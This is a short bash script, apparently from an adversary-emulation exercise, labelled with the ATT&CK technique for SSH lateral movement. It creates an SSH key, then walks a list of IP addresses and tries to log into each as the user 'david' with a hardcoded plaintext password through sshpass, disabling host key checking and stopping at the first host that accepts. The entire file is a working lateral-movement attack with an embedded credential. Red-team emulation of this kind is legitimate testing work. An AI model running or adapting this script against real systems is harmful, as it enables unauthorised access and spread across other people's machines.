#!/bin/bash
# T1021 - Remote Services
## T1021.004 - SSH

# Create ssh-key for s1
mkdir -p ~/.ssh
ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa <<< y

for ip in `cat ips_sorted.txt`; do
    echo -e "[+] Attempting to ssh to david@$ip"
    sshpass -p "huanyinkoh95" ssh -o StrictHostKeyChecking=no david@$ip
    if [ $? -eq 0 ]; then
        break
    else 
        echo -e "[-] SSH on $ip not available"
    fi
done